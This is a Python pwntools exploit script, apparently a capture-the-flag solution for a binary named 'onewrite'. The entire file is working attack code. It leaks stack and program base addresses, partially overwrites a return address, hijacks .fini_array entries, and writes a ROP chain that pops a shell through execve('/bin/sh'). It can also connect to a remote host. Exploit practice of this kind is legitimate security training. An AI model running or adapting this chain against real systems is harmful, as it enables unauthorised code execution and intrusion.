#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from warnings import filterwarnings

# Set up pwntools for the correct architecture
exe = context.binary = ELF('onewrite')
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']

filterwarnings("ignore")
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-gef
break *do_overwrite+81
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()

def write(addr, value, qword = 0):
    io.recvuntil('address :')
    io.send(str(addr))
    io.recvuntil('data :')
    if qword == 0:
        io.send(p64(value))
    else:
        io.send(p8(value))

def getleak(case):
    io.recvuntil('>')
    io.sendline(str(case))
    leak = io.recvline()
    leaked = int(leak[1:-1], 16)

    return leaked

def partialWrite():
    global stack

    stack = getleak(1)
    ret_adddress = stack + 0x18
    write(ret_adddress, 0x04, 1)

    exe.address = getleak(2) - exe.sym['do_leak']

    info("stack leak: %#x", stack)
    info("main rip: %#x", ret_adddress)
    info("elf base: %#x", exe.address)

    write(ret_adddress, 0x04, 1)
    getleak(1)


def writeChain(address, value):
    global csu_ret
    write(address, value)
    write(csu_ret, csu_fini)
    csu_ret += 8


def writeRop():
    """
    - Overwrite the two entries in the fini array (0x10) with do_overwrite()
    """

    global csu_fini, csu_ret

    fini_array = exe.sym['__do_global_dtors_aux_fini_array_entry']
    csu_fini = exe.sym['__libc_csu_fini']
    csu_ret = stack - 0x48

    info(".fini_array: %#x", fini_array)
    info("__libc_csu_fini: %#x", csu_fini)
    info("__libc_csu_fini rip: %#x", csu_ret)

    write(fini_array + 8, exe.sym['do_overwrite'])
    write(fini_array, exe.sym['do_overwrite'])
    write(csu_ret, csu_fini)

    csu_ret += 8

    sh_addr = exe.sym['data_start'] + 0x30
    pop_rax = exe.address + 0x00000000000460ac # pop rax; ret; 
    pop_rdi = exe.address + 0x00000000000084fa # pop rdi; ret; 
    pop_rsi = exe.address + 0x000000000000d9f2 # pop rsi; ret; 
    pop_rdx = exe.address + 0x00000000000484c5 # pop rdx; ret;
    syscall = exe.address + 0x000000000000917c # syscall; 
    stack_pivot = exe.address + 0x00000000000106f3 # add rsp, 0xd0 ; pop rbx ; ret

    info("sh @: %#x", sh_addr)

    writeChain(sh_addr, u64('/bin/sh\x00'))
    writeChain(stack + 0xd0, pop_rdi)
    writeChain(stack + 0xd8, sh_addr)
    writeChain(stack + 0xe0, pop_rsi)
    writeChain(stack + 0xe8, 0x0)
    writeChain(stack + 0xf0, pop_rdx)
    writeChain(stack + 0xf8, 0x0)
    writeChain(stack + 0x100, pop_rax)
    writeChain(stack + 0x108, 0x3b)
    writeChain(stack + 0x110, syscall)

    write(stack - 0x10, stack_pivot)    
    # writeChain(stack - 0x10, stack_pivot)

def solve():

    partialWrite()
    writeRop()

    io.interactive()


def main():
    
    init()
    solve()

if __name__ == '__main__':
    main()

